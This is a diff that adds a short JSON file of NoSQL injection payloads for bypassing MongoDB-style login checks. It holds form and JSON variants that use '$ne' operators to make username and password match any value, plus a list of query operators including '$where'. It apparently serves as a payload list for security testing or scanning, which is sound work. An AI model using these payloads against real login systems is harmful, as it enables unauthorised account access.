@@ -1,0 +1,35 @@
+{
+  "login_bypass_form": [
+    {
+      "username": "admin",
+      "password[$ne]": "invalid"
+    },
+    {
+      "username[$ne]": "",
+      "password[$ne]": ""
+    }
+  ],
+  "login_bypass_json": [
+    {
+      "username": {
+        "$ne": null
+      },
+      "password": {
+        "$ne": null
+      }
+    },
+    {
+      "username": "admin",
+      "password": {
+        "$ne": ""
+      }
+    }
+  ],
+  "operators": [
+    "$ne",
+    "$gt",
+    "$regex",
+    "$exists",
+    "$where"
+  ]
+}
